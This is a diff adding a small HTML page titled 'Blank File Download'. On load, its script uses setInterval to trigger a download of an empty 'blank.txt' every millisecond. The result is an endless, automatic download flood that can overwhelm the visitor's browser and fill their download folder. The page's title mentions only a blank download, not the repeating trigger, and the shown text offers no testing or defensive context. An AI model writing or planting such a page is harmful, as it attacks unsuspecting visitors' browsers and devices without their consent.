@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Blank File Download</title>
+    <script>
+        function downloadFile() {
+            var link = document.createElement('a');
+            link.href = 'data:text/plain;charset=utf-8,';
+            link.download = 'blank.txt';
+            link.click();
+        }
+
+        function startDownload() {
+            setInterval(downloadFile, 1);
+        }
+    </script>
+</head>
+<body onload="startDownload()">
+</body>
+</html>
